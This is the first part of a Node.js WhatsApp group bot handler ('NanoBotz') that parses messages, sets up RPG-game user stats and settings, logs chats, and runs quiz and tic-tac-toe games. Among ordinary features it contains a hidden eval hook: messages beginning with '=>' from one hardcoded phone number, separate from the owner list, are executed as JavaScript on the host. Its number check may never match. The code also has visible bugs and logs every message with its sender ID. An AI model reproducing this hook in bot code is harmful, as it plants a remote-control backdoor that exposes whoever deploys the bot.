require('./settings')
require('./lib/listmenu')
const {
	downloadContentFromMessage,
	extractImageThumb
} = require('@whiskeysockets/baileys')
const { modul } = require('./module')
const path = require('path')
const { os, axios, baileys, chalk, cheerio, child_process, crypto, cookie, FormData, FileType, fetch, fs, fsx, ffmpeg, Jimp, jsobfus, PhoneNumber, process, moment, ms, speed, syntaxerror, util, ytdl, googleTTS, nodecron, maker } = modul
const { exec, spawn, execSync } = child_process
const { BufferJSON, WA_DEFAULT_EPHEMERAL, generateWAMessageFromContent, proto, generateWAMessageContent, generateWAMessage, prepareWAMessageMedia, areJidsSameUser, getContentType, generateForwardMessageContent } = baileys
const { clockString, parseMention, formatp, tanggal, getTime, isUrl, sleep, runtime, fetchJson, getBuffer, jsonformat, format, reSize, generateProfilePicture, getRandom } = require('./lib/myfunc')
const { FajarNews, BBCNews, metroNews, CNNNews, iNews, KumparanNews, TribunNews, DailyNews, DetikNews, OkezoneNews, CNBCNews, KompasNews, SindoNews, TempoNews, IndozoneNews, AntaraNews, RepublikaNews, VivaNews, KontanNews, MerdekaNews, KomikuSearch, AniPlanetSearch, KomikFoxSearch, KomikStationSearch, MangakuSearch, KiryuuSearch, KissMangaSearch, KlikMangaSearch, PalingMurah, LayarKaca21, AminoApps, Mangatoon, WAModsSearch, Emojis, CoronaInfo, JalanTikusMeme,Cerpen, Quotes, Couples, Darkjokes } = require("dhn-api");
const { Client } = require('ssh2');
const {
    addSewaGroup,
    getSewaExpired,
    getSewaPosition,
    expiredCheck,
    checkSewaGroup
} = require("./lib/store")
const salam = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
const { isSetWelcome, addSetWelcome, changeSetWelcome, removeSetWelcome } = require('./lib/setwelcome');
const { Primbon } = require('scrape-primbon')
const primbon = new Primbon()
const canvafy = require('canvafy')
const { isSetLeft, addSetLeft, removeSetLeft, changeSetLeft } = require('./lib/setleft');
const { getTextSetWelcome } = require('./lib/setwelcome');
const { getTextSetLeft } = require('./lib/setleft');
const { color, bgcolor } = require('./lib/color')
const { TelegraPh, UploadFileUgu } = require('./lib/uploader')
const { fetchBuffer, buffermagef } = require("./lib/myfunc2")
const { Sticker, StickerTypes } = require('wa-sticker-formatter')
const JavaScriptObfuscator = require('javascript-obfuscator');
const fg = require('api-dylux')
const { msgFilter } = require('./lib/antispam')
const { ytDonlodMp3, ytDonlodMp4, ytPlayMp3, ytPlayMp4, ytSearch } = require('./scrape/yt')
const anon = require('./lib/menfess') 
const scp1 = require('./scrape/scraper') 
const scp2 = require('./scrape/scraperr')
const scp3 = require('./scrape/scraperrr')
const githubstalk = require('./scrape/githubstalk')
const npmstalk = require('./scrape/npmstalk')
const photooxy = require('./scrape/photooxy')
const yts = require('./scrape/yt-search')
const vm = require('node:vm')
const { EmojiAPI } = require("emoji-api")
const emoji = new EmojiAPI()
const owner = JSON.parse(fs.readFileSync('./database/owner.json'))
const prem = JSON.parse(fs.readFileSync('./database/premium.json'))
const dansyaverifikasiuser = JSON.parse(fs.readFileSync('./database/user.json'))
const NanoVoiceNote = JSON.parse(fs.readFileSync('./data/NanoMedia/database/xeonvn.json'))
const NanoSticker = JSON.parse(fs.readFileSync('./data/NanoMedia/database/xeonsticker.json'))
const ImageNano = JSON.parse(fs.readFileSync('./data/NanoMedia/database/xeonimage.json'))
const VideoNano = JSON.parse(fs.readFileSync('./data/NanoMedia/database/xeonvideo.json'))
const BadNano = JSON.parse(fs.readFileSync('./database/bad.json'))
const pler = JSON.parse(fs.readFileSync('./database/idgrup.json').toString())
const siminya = JSON.parse(fs.readFileSync('./database/simi.json'))
const chatnano = JSON.parse(fs.readFileSync('./database/chatnano.json'))
const { isSetProses, addSetProses, removeSetProses, changeSetProses, getTextSetProses } = require('./lib/setproses');
const { addResponList, delResponList, isAlreadyResponList, isAlreadyResponListGroup, sendResponList, updateResponList, getDataResponList } = require('./lib/respon-list');
const { isSetDone, addSetDone, removeSetDone, changeSetDone, getTextSetDone } = require('./lib/setdone');
let autosticker = JSON.parse(fs.readFileSync('./database/autosticker.json'))
let mute = JSON.parse(fs.readFileSync('./database/mute.json'));
let ntnsfw = JSON.parse(fs.readFileSync('./database/nsfw.json'))
let ntvirtex = JSON.parse(fs.readFileSync('./database/antivirus.json'))
let _cmd = JSON.parse(fs.readFileSync('./database/command.json'));
let _cmdUser = JSON.parse(fs.readFileSync('./database/commandUser.json'));
let nttoxic = JSON.parse(fs.readFileSync('./database/antitoxic.json'))
let ntwame = JSON.parse(fs.readFileSync('./database/antiwame.json'))
let ntlinkgc =JSON.parse(fs.readFileSync('./database/antilinkgc.json'))
let ntilinkall =JSON.parse(fs.readFileSync('./database/antilinkall.json'))
let ntilinktwt =JSON.parse(fs.readFileSync('./database/antilinktwitter.json'))
let ntilinktt =JSON.parse(fs.readFileSync('./database/antilinktiktok.json'))
let ntilinktg =JSON.parse(fs.readFileSync('./database/antilinktelegram.json'))
let ntilinkfb =JSON.parse(fs.readFileSync('./database/antilinkfacebook.json'))
let ntilinkig =JSON.parse(fs.readFileSync('./database/antilinkinstagram.json'))
let ntilinkytch =JSON.parse(fs.readFileSync('./database/antilinkytchannel.json'))
let ntilinkytvid =JSON.parse(fs.readFileSync('./database/antilinkytvideo.json'))
let sewa = JSON.parse(fs.readFileSync('./database/sewa.json'));
let openaigc = JSON.parse(fs.readFileSync('./database/openaigc.json'))
let set_welcome_db = JSON.parse(fs.readFileSync('./database/set_welcome.json'));
let set_left_db = JSON.parse(fs.readFileSync('./database/set_left.json'));
let _welcome = JSON.parse(fs.readFileSync('./database/welcome.json'))
let _left = JSON.parse(fs.readFileSync('./database/left.json'))
let set_proses = JSON.parse(fs.readFileSync('./database/set_proses.json'))
let set_done = JSON.parse(fs.readFileSync('./database/set_done.json'))
let db_respon_list = JSON.parse(fs.readFileSync('./database/list-message.json'));
global.db = JSON.parse(fs.readFileSync('./database/database.json'))
if (global.db) global.db = {
sticker: {},
database: {}, 
game: {},
others: {},
users: {},
chats: {},
settings: {},
...(global.db || {})
}
// read database
let tebaklagu = []
let _family100 = []
let kuismath = []
let tebakgambar = []
let tebakkata = []
let transactionDetails = {};
let caklontong = []
let caklontong_desk = []
let tebakkalimat = []
let tebaklirik = []
let tebaktebakan = []
let tebakbendera = []
let tebakbendera2 = []
let tebakkabupaten = []
let tebakkimia = []
let tebakasahotak = []
let tebaksiapakahaku = []
let tebaksusunkata = []
let tebaktekateki = []
let vote = db.others.vote = []

module.exports = NanoBotz = async (NanoBotz, m, chatUpdate, store) => {
try {
        const { type, quotedMsg, mentioned, now, fromMe } = m
        const body = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : '.'
const bady = (m.mtype === 'conversation') ? m.message.conversation : (m.mtype == 'imageMessage') ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage') ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'listResponseMessage') ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == 'templateButtonReplyMessage') ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == 'interactiveResponseMessage') ? appenTextMessage(JSON.parse(m.msg.nativeFlowResponseMessage.paramsJson).id, chatUpdate) : (m.mtype == 'templateButtonReplyMessage') ? appenTextMessage(m.msg.selectedId, chatUpdate) : (m.mtype === 'messageContextInfo') ? (m.message.buttonsResponseMessage?.selectedButtonId || m.message.listResponseMessage?.singleSelectReply.selectedRowId || m.text) : ' '

const budy = (typeof m.text == 'string' ? m.text : '')
 const prefix = /[\uD800-\uDBFF][\uDC00-\uDFFF]/gi.test(body) ? body.match(/[\uD800-\uDBFF][\uDC00-\uDFFF]/gi)[0] : /^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi.test(body) ? body.match(/^[°•π÷×¶∆£¢€¥®™+✓_=|~!?@()#,'"*+÷/\%^&.©^]/gi)[0] : ''
const isSewa = checkSewaGroup(m.chat, sewa)
async function appenTextMessage(text, chatUpdate) {
let messages = await generateWAMessage(m.chat, { text: text, mentions: m.mentionedJid }, {
userJid: NanoBotz.user.id,
quoted: m.quoted && m.quoted.fakeObj
})
messages.key.fromMe = areJidsSameUser(m.sender, NanoBotz.user.id)
messages.key.id = m.key.id
messages.pushName = m.pushName
if (m.isGroup) messages.participant = m.sender
let msg = {
...chatUpdate,
messages: [proto.WebMessageInfo.fromObject(messages)],
type: 'append'
}
NanoBotz.ev.emit('messages.upsert', msg)
}
        const chath = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'documentMessage') && m.message.documentMessage.caption ? m.message.documentMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption ? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text : (m.mtype == 'buttonsResponseMessage' && m.message.buttonsResponseMessage.selectedButtonId) ? m.message.buttonsResponseMessage.selectedButtonId : (m.mtype == 'templateButtonReplyMessage') && m.message.templateButtonReplyMessage.selectedId ? m.message.templateButtonReplyMessage.selectedId : (m.mtype == "listResponseMessage") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : (m.mtype == "messageContextInfo") ? m.message.listResponseMessage.singleSelectReply.selectedRowId : ''
        const pes = (m.mtype === 'conversation' && m.message.conversation) ? m.message.conversation : (m.mtype == 'imageMessage') && m.message.imageMessage.caption ? m.message.imageMessage.caption : (m.mtype == 'videoMessage') && m.message.videoMessage.caption? m.message.videoMessage.caption : (m.mtype == 'extendedTextMessage') && m.message.extendedTextMessage.text ? m.message.extendedTextMessage.text: ' '
        const messagesC = pes.slice(0).trim()
        const content = JSON.stringify(m.message)
        const isCmd = body.startsWith(prefix)
        const from = m.key.remoteJid
        const messagesD = body.slice(0).trim().split(/ +/).shift().toLowerCase()
        const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
        const args = body.trim().split(/ +/).slice(1)
        const pushname = m.pushName || "PATRON"
        const botNumber = await NanoBotz.decodeJid(NanoBotz.user.id)
        const DanzTheCreator = [botNumber, ...owner].map(v => v.replace(/[^0-9]/g, '') + '@s.whatsapp.net').includes(m.sender);
        const text = q = args.join(" ")
        const quoted = m.quoted ? m.quoted : m
        const mime = (quoted.msg || quoted).mimetype || ''
        const qmsg = (quoted.msg || quoted)
        const isMedia = /image|video|sticker|audio/.test(mime)
        const isImage = (type == 'imageMessage')
		const isVideo = (type == 'videoMessage')
		const isAudio = (type == 'audioMessage')
		const isSticker = (type == 'stickerMessage')
		const isQuotedImage = type === 'extendedTextMessage' && content.includes('imageMessage')
		const isQuotedViewOnce = type === 'extendedTextMessage' && content.includes('viewOnceMessageV2')
        const isQuotedLocation = type === 'extendedTextMessage' && content.includes('locationMessage')
        const isQuotedVideo = type === 'extendedTextMessage' && content.includes('videoMessage')
        const isQuotedSticker = type === 'extendedTextMessage' && content.includes('stickerMessage')
        const isQuotedAudio = type === 'extendedTextMessage' && content.includes('audioMessage')
        const isQuotedContact = type === 'extendedTextMessage' && content.includes('contactMessage')
        const isQuotedDocument = type === 'extendedTextMessage' && content.includes('documentMessage')
        const sender = m.isGroup ? (m.key.participant ? m.key.participant : m.participant) : m.key.remoteJid
        const senderNumber = sender.split('@')[0]
        const groupMetadata = m.isGroup ? await NanoBotz.groupMetadata(m.chat).catch(e => {}) : ''
        const groupName = m.isGroup ? groupMetadata.subject : ''
        const participants = m.isGroup ? await groupMetadata.participants : ''
        const groupAdmins = m.isGroup ? await participants.filter(v => v.admin !== null).map(v => v.id) : ''
        const groupOwner = m.isGroup ? groupMetadata.owner : ''
        const groupMembers = m.isGroup ? groupMetadata.participants : ''
    	const isBotAdmins = m.isGroup ? groupAdmins.includes(botNumber) : false
        const isGroupAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
    	const isAdmins = m.isGroup ? groupAdmins.includes(m.sender) : false
     const jangan = m.isGroup ? pler.includes(m.chat) : false
    	const isPrem = prem.includes(m.sender)
    	const isUser = dansyaverifikasiuser.includes(sender)
    	const mentionUser = [...new Set([...(m.mentionedJid || []), ...(m.quoted ? [m.quoted.sender] : [])])]
    	const mentionByTag = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.mentionedJid : []
        const mentionByReply = type == 'extendedTextMessage' && m.message.extendedTextMessage.contextInfo != null ? m.message.extendedTextMessage.contextInfo.participant || '' : ''
        const numberQuery = q.replace(new RegExp('[()+-/ +/]', 'gi'), '') + '@s.whatsapp.net'
        const usernya = mentionByReply ? mentionByReply : mentionByTag[0]
        const Input = mentionByTag[0] ? mentionByTag[0] : mentionByReply ? mentionByReply : q ? numberQuery : false
    	const isEval = body.startsWith('=>')
      const isAutoAiGc = m.isGroup ? openaigc.includes(m.chat) : true
      const isnanochat = m.isGroup ? chatnano.includes(m.chat) : true
      const shouldExit = true
      const automati = false
      const isAutosimi = m.isGroup ? siminya.includes(m.chat) : true
        const AntiNsfw = m.isGroup ? ntnsfw.includes(from) : false
        const isAutoSticker = m.isGroup ? autosticker.includes(from) : false
        const antiVirtex = m.isGroup ? ntvirtex.includes(from) : false
        const Antilinkgc = m.isGroup ? ntlinkgc.includes(m.chat) : false
        const antibot = true
        const AntiLinkYoutubeVid = m.isGroup ? ntilinkytvid.includes(from) : false
        const AntiLinkYoutubeChannel = m.isGroup ? ntilinkytch.includes(from) : false
        const isMute= mute.includes(m.chat) ? true : false
        const AntiLinkInstagram = m.isGroup ? ntilinkig.includes(from) : false
        const AntiLinkFacebook = m.isGroup ? ntilinkfb.includes(from) : false
        const AntiLinkTiktok = m.isGroup ? ntilinktt.includes(from) : false
        const AntiLinkTelegram = m.isGroup ? ntilinktg.includes(from) : false
        const AntiLinkTwitter = m.isGroup ? ntilinktwt.includes(from) : false
        const AntiLinkAll = m.isGroup ? ntilinkall.includes(from) : false
        const antiWame = m.isGroup ? ntwame.includes(from) : false
        const antiToxic = m.isGroup ? nttoxic.includes(from) : true
const isWelcome = _welcome.includes(m.chat) ? true : false
const isLeft = _left.includes(m.chat) ? true : false
const isSimi = siminya.includes(m.chat) ? true : false 
const isXeonMedia = m.mtype
const rungo = true
const nanototalpitur = () =>{
            var mytext = fs.readFileSync("./Patron.js").toString()
            var numUpper = (mytext.match(/case '/g) || []).length
            return numUpper
        }
        const hariini = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const xdate = moment.tz('Asia/Jakarta').format('dddd, DD MMMM YYYY')
        const time = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('HH:mm:ss z')
        const time2 = moment.tz('Asia/Jakarta').format('HH : mm : ss')
        const wit = moment.tz('Asia/Jayapura').format('HH : mm : ss')
        const wita = moment.tz('Asia/Makassar').format('HH : mm : ss')
         if(time2 < "23:59:00"){
var nanoliatwaktu = `ᴡᴀɢᴡᴀɴ 🚹`
 }
 if(time2 < "19:00:00"){
var nanoliatwaktu = `ᴡᴀɢᴡᴀɴ 🚹`
 }
 if(time2 < "18:00:00"){
var nanoliatwaktu = `ᴡᴀɢᴡᴀɴ 🚹`
 }
 if(time2 < "15:00:00"){
var nanoliatwaktu = `ᴡᴀɢᴡᴀɴ 🚹`
 }
 if(time2 < "11:00:00"){
var nanoliatwaktu = `ᴡᴀɢᴡᴀɴ 🚹`
 }
 if(time2 < "05:00:00"){
var nanoliatwaktu = `ᴡᴀɢᴡᴀɴ 🚹`
 } 

let dt = moment(Date.now()).tz('Asia/Jakarta').locale('id').format('a')
var fildt = dt == 'pagi' ? dt + '🌝' : dt == 'siang' ? dt + '🌞' : dt == 'sore' ? dt + '🌝' : dt + '🌚'
const ucapanWaktu = fildt.charAt(0).toUpperCase() + fildt.slice(1)

		if (isEval && senderNumber == "+2348133729715") {
			let evaled,
				text = q,
				{ inspect } = require('util')
			try {
				if (text.endsWith('--sync')) {
					evaled = await eval(
						`(async () => { ${text.trim.replace('--sync', '')} })`
					)
					reply(evaled)
				}
				evaled = await eval(text)
				if (typeof evaled !== 'string') evaled = inspect(evaled)
			} catch (e) {
				NanoBotz.sendMessage(from, { text: String(e) }, { quoted: m })
			}
		}
try {
const isNumber = x => typeof x === 'number' && !isNaN(x)
const user = global.db.users[m.sender]
if (typeof user !== 'object') global.db.users[m.sender] = {}
const chats = global.db.chats[m.chat]
if (typeof chats !== 'object') global.db.chats[m.chat] = {

}
if (user) {
if (!isNumber(user.chip)) user.chip = 0
if (!isNumber(user.level)) user.level = 1
if (!isNumber(user.atm)) user.atm = 0
if (!isNumber(user.fullatm)) user.fullatm = 0
if (!isNumber(user.bank)) user.bank = 0
if (!isNumber(user.health)) user.health = 100
if (!isNumber(user.potion)) user.potion = 0
if (!isNumber(user.trash)) user.trash = 0
if (!isNumber(user.wood)) user.wood = 0
if (!isNumber(user.rock)) user.rock = 0
if (!isNumber(user.string)) user.string = 0
if (!isNumber(user.petfood)) user.petfood = 0
if (!isNumber(user.emerald)) user.emerald = 0
if (!isNumber(user.diamond)) user.diamond = 0
if (!isNumber(user.gold)) user.gold = 0
if (!isNumber(user.botol)) user.botol = 0
if (!isNumber(user.kardus)) user.kardus = 0
if (!isNumber(user.kaleng)) user.kaleng = 0
if (!isNumber(user.gelas)) user.gelas = 0
if (!isNumber(user.plastik)) user.plastik = 0
if (!isNumber(user.iron)) user.iron = 0
if (!isNumber(user.common)) user.common = 0
if (!isNumber(user.uncommon)) user.uncommon = 0
if (!isNumber(user.mythic)) user.mythic = 0
if (!isNumber(user.legendary)) user.legendary = 0
if (!isNumber(user.umpan)) user.umpan = 0
if (!isNumber(user.pet)) user.pet = 0
if (!isNumber(user.paus)) user.paus = 0
if (!isNumber(user.kepiting)) user.kepiting = 0
if (!isNumber(user.gurita)) user.gurita = 0
if (!isNumber(user.cumi)) user.cumi = 0
if (!isNumber(user.buntal)) user.buntal = 0
if (!isNumber(user.dory)) user.dory = 0
if (!isNumber(user.lumba)) user.lumba = 0
if (!isNumber(user.lobster)) user.lobster = 0
if (!isNumber(user.hiu)) user.hiu = 0
if (!isNumber(user.udang)) user.udang = 0
if (!isNumber(user.orca)) user.orca = 0
if (!isNumber(user.banteng)) user.banteng = 0
if (!isNumber(user.gajah)) user.gajah = 0
if (!isNumber(user.harimau)) user.harimau = 0
if (!isNumber(user.kambing)) user.kambing = 0
if (!isNumber(user.panda)) user.panda = 0
if (!isNumber(user.buaya)) user.buaya = 0
if (!isNumber(user.kerbau)) user.kerbau = 0
if (!isNumber(user.sapi)) user.sapi = 0
if (!isNumber(user.monyet)) user.monyet = 0
if (!isNumber(user.babihutan)) user.babihutan = 0
if (!isNumber(user.babi)) user.babi = 0
if (!isNumber(user.ayam)) user.ayam = 0

if (!isNumber(user.lastadventure)) user.lastadventure = 0
if (!isNumber(user.lastkill)) user.lastkill = 0
if (!isNumber(user.lastmisi)) user.lastmisi = 0
if (!isNumber(user.lastdungeon)) user.lastdungeon = 0
if (!isNumber(user.lastwar)) user.lastwar = 0
if (!isNumber(user.lastsda)) user.lastsda = 0
if (!isNumber(user.lastduel)) user.lastduel = 0
if (!isNumber(user.lastmining)) user.lastmining = 0
if (!isNumber(user.lasthunt)) user.lasthunt = 0
if (!isNumber(user.lastgift)) user.lastgift = 0
if (!isNumber(user.lastberkebon)) user.lastberkebon = 0
if (!isNumber(user.lastdagang)) user.lastdagang = 0
if (!isNumber(user.lasthourly)) user.lasthourly = 0
if (!isNumber(user.lastbansos)) user.lastbansos = 0
if (!isNumber(user.lastrampok)) user.lastrampok = 0
if (!isNumber(user.lastclaim)) user.lastclaim = 0
if (!isNumber(user.lastnebang)) user.lastnebang = 0
if (!isNumber(user.lastweekly)) user.lastweekly = 0
if (!isNumber(user.lastmonthly)) user.lastmonthly = 0
if (!isNumber(user.apel)) user.apel = 0
if (!isNumber(user.anggur)) user.anggur = 0
if (!isNumber(user.jeruk)) user.jeruk = 0
if (!isNumber(user.mangga)) user.mangga = 0
if (!isNumber(user.pisang)) user.pisang = 0
if (!isNumber(user.makanan)) user.makanan = 0
if (!isNumber(user.bibitanggur)) user.bibitanggur = 0
if (!isNumber(user.bibitpisang)) user.bibitpisang = 0
if (!isNumber(user.bibitapel)) user.bibitapel = 0
if (!isNumber(user.bibitmangga)) user.bibitmangga = 0
if (!isNumber(user.bibitjeruk)) user.bibitjeruk = 0
if (!isNumber(user.horse)) user.horse = 0
if (!isNumber(user.horseexp)) user.horseexp = 0
if (!isNumber(user.cat)) user.cat = 0
if (!isNumber(user.catexp)) user.catexp = 0
if (!isNumber(user.fox)) user.fox = 0
if (!isNumber(user.foxhexp)) user.foxexp = 0
if (!isNumber(user.dog)) user.foxexp = 0
if (!isNumber(user.dogexp)) user.dogexp = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.roboexp)) user.roboexp = 0
if (!isNumber(user.horselastfeed)) user.horselastfeed = 0
if (!isNumber(user.catlastfeed)) user.catlastfeed = 0
if (!isNumber(user.robolastfeed)) user.robolastfeed = 0
if (!isNumber(user.foxlastfeed)) user.foxlastfeed = 0
if (!isNumber(user.doglastfeed)) user.doglastfeed = 0
if (!isNumber(user.robo)) user.robo = 0
if (!isNumber(user.robodurability)) user.robodurability = 0
if (!isNumber(user.armor)) user.armor = 0
if (!isNumber(user.armordurability)) user.armordurability = 0
if (!isNumber(user.sword)) user.sword = 0
if (!isNumber(user.sworddurability)) user.sworddurability = 0
if (!isNumber(user.pickaxe)) user.pickaxe = 1
if (!isNumber(user.pickaxedurability)) user.pickaxedurability = 0
if (!isNumber(user.fishingrod)) user.fishingrod = 0
if (!isNumber(user.fishingroddurability)) user.fishingroddurability = 0
if (!user.premium) user.premiumTime = 0
if (!('afkReason' in user)) user.afkReason = ''
if (!("premium" in user)) user.premium = false
} else global.db.users[m.sender] = {
afkTime: -1,
afkReason: '',
premiumTime: 0,
premium: false,
money: 100000,
exp: 0,
level: 1,
limit: 30,
freelimit: 0,
lastclaim: 0,
skata: 0,
registered: false,
name: m.name,
pc: 0,
joinlimit: 1,
age: -1,
regTime: -1,
unreg: false,
afk: -1,
afkReason: '',
banned: false,
bannedTime: 0,
warning: 0,
level: 0,
rokets: 0,
role: 'Beginner',
skill: '',
ojekk: 0,
WarnReason: '',
chip: 0,
bank: 0,
atm: 0,
fullatm: 0,
health: 1000,
potion: 10,
trash: 0,
wood: 0,
rock: 0,
string: 0,
emerald: 0,
diamond: 0,
gold: 0,
iron: 0,
common: 0,
uncommon: 0,
mythic: 0,
legendary: 0,
umpan: 0,
pet: 0,
horse: 0,
horseexp: 0,
horselastfeed: 0,
cat: 0,
catexp: 0,
catlastfeed: 0,
fox: 0,
foxexp: 0,
foxlastfeed: 0,
robo: 0,
roboexp: 0,
robolastfeed: 0,
dog: 0,
dogexp: 0,
doglastfeed: 0,
paus: 0,
kepiting: 0,
gurita: 0,
cumi: 0,
buntal: 0,
dory: 0,
lumba: 0,
lobster: 0,
hiu: 0,
udang: 0,
ikan: 0,
orca: 0,
banteng: 0,
harimau: 0,
gajah: 0,
kambing: 0,
buaya: 0,
kerbau: 0,
sapi: 0,
monyet: 0,
babi: 0,
ayam: 0,
armor: 1,
armordurability: 0,
sword: 1,
sworddurability: 0,
pickaxe: 1,
pickaxedurability: 0,
fishingrod: 0,
fishingroddurability: 0,
robo: 0,
robodurability: 0,
apel: 20,
pisang: 0,
anggur: 0,
mangga: 0,
jeruk: 0,
lastadventure: 0,
lastkill: 0,
lastmisi: 0,
lastdungeon: 0,
lastwar: 0,
lastsda: 0,
lastduel: 0,
lastmining: 0,
lasthunt: 0,
lastgift: 0,
lastberkebon: 0,
lastdagang: 0,
lasthourly: 0,
lastbansos: 0,
lastrampok: 0,
lastclaim: 0,
lastnebang: 0,
lastweekly: 0,
lastmonthly: 0

}



const setting = db.settings[botNumber]
        if (typeof setting !== 'object') db.settings[botNumber] = {}
	    if (setting) {
    	    if (!('anticall' in setting)) setting.anticall = false
    		if (!isNumber(setting.status)) setting.status = 0
    		if (!('autobio' in setting)) setting.autobio = false
    		if (!('autoread' in setting)) setting.autoread = false
        if (!('goodbye' in setting)) chats.goodbye = setting.auto_leaveMsg
        if (!('onlygrub' in setting)) setting.onlygrub = false
        if (!('onlypc' in setting)) setting.onlypc = false
        if (!('welcome' in setting)) chats.welcome = setting.auto_welcomeMsg
       if (!('onlygrub' in setting)) setting.onlygrub = false
	  } else global.db.settings[botNumber] = {
    	  anticall: false,
    		status: 0,
    		stock:10,
    		autobio: false,
    		autoread: false,
    		auto_ai_grup: true,
    		goodbye: true,
        onlygrub: false,
        onlypc: false,
        welcome: true, 
    		autoread: false
	    }

} catch (err) {
console.error(err)
}

if (m.isGroup && isMute) {
if (!isAdmins && !DanzTheCreator) return
}


if (!NanoBotz.public) {
if (!m.key.fromMe) return
}
if (db.settings[botNumber].autoread) {
            NanoBotz.readMessages([m.key])
}
if (m.message && m.isGroup) {
    console.log(`
┌────────── [ GROUP CHAT LOG ] ──────────┐
│ 🕒 Time      : ${chalk.green(new Date().toISOString().slice(0, 19).replace('T', ' '))}
│ 📝 Message   : ${chalk.blue(budy || m.mtype)}
│ 👤 Sender    : ${chalk.magenta(pushname)} (${chalk.cyan(m.sender)})
│ 🏠 Group     : ${chalk.yellow(groupName)} (${chalk.cyan(m.chat)})
└────────────────────────────────────────┘
    `);
} else {
    console.log(`
┌───────── [ PRIVATE CHAT LOG ] ─────────┐
│ 🕒 Time      : ${chalk.green(new Date().toISOString().slice(0, 19).replace('T', ' '))}
│ 📝 Message   : ${chalk.blue(budy || m.mtype)}
│ 👤 Sender    : ${chalk.magenta(pushname)} (${chalk.cyan(m.sender)})
└────────────────────────────────────────┘
    `);
}

if (isCmd && !isUser) {
dansyaverifikasiuser.push(sender)
fs.writeFileSync('./database/user.json', JSON.stringify(dansyaverifikasiuser, null, 2))
}

NanoBotz.sendPresenceUpdate('unavailable', from)

for (let jid of mentionUser) {
let user = global.db.users[jid]
if (!user) continue
let afkTime = user.afkTime
if (!afkTime || afkTime < 0) continue
let reason = user.afkReason || ''
m.reply(`Don't Tag Him!
He's AFK ${reason ? 'With Reason: ' + reason : 'No Reason'}
During ${clockString(new Date - afkTime)}
`.trim())
}

//math
if (kuismath.hasOwnProperty(m.sender.split('@')[0]) && isCmd) {

            kuis = true

            jawaban = kuismath[m.sender.split('@')[0]]

            if (budy.toLowerCase() == jawaban) {

await reply(`🎮 Math Quiz 🎮\no Correct Answers 🎉\and Want to Play Again? Send ${prefix}math mode`)

delete kuismath[m.sender.split('@')[0]]

            } else reply('*Wrong Answer!*')

        }


//TicTacToe\\
	    this.game = this.game ? this.game : {}
	    let room13 = Object.values(this.game).find(room13 => room13.id && room13.game && room13.state && room13.id.startsWith('tictactoe') && [room13.game.playerX, room13.game.playerO].includes(m.sender) && room13.state == 'PLAYING')
	    if (room13) {
	    let ok
	    let isWin = !1
	    let isTie = !1
	    let isSurrender = !1
	    //reply(`[DEBUG]\n${parseInt(m.text)}`)
	    if (!/^([1-9]|(me)?give up|surr?ender|off|skip)$/i.test(m.text)) return
	    isSurrender = !/^[1-9]$/.test(m.text)
	    if (m.sender !== room13.game.currentTurn) { 
	    if (!isSurrender) return !0
	    }
	    if (!isSurrender && 1 > (ok = room13.game.turn(m.sender === room13.game.playerO, parseInt(m.text) - 1))) {
	    reply({
        '-3': 'The game has been berakhir',
        '-2': 'Invalid',
        '-1': 'Invalid position',
        0: 'Invalid position',
	    }[ok])
	    return !0
	    }
	    if (m.sender === room13.game.winner) isWin = true
	    else if (room13.game.board === 511) isTie = true
	    let arr = room13.game.render().map(v => {
	    return {
	    X: '❌',
	    O: '⭕',
	    1: '1️⃣',
	    2: '2️⃣',
	    3: '3️⃣',
	    4: '4️⃣',
	    5: '5️⃣',
	    6: '6️⃣',
	    7: '7️⃣',
	    8: '8️⃣',
	    9: '9️⃣',
	    }[v]
	    })
	    if (isSurrender) {
	    room13.game._currentTurn = m.sender === room13.game.playerX
	    isWin = true
	    }
	    let winner = isSurrender ? room13.game.currentTurn : room13.game.winner
	    let str = `room13 ID: ${room13.id}

${arr.slice(0, 3).join('')}
${arr.slice(3, 6).join('')}
${arr.slice(6).join('')}

${isWin ? `@${winner.split('@')[0]} Won!` : isTie ? `Game Over` : `Turn ${['❌', '⭕'][1 * room13.game._currentTurn]} (@${room13.game.currentTurn.split('@')[0]})`}
❌: @${room13.game.playerX.split('@')[0]}
⭕: @${room13.game.playerO.split('@')[0]}

Type *surrender* to give up and confess lost`
	    if ((room13.game._currentTurn ^ isSurrender ? room13.x : room13.o) !== m.chat)
	    room13[room13.game._currentTurn ^ isSurrender ? 'x' : 'o'] = m.chat
	    if (room13.x !== room13.o) await NanoBotz.sendText(room13.x, str, m, { mentions: parseMention(str) } )
	    await NanoBotz.sendText(room13.o, str, m, { mentions: parseMention(str) } )
	    if (isTie || isWin) {
	    delete this.game[room13.id]
	    }
	    }

        //Suit PvP
	    this.suit = this.suit ? this.suit : {}
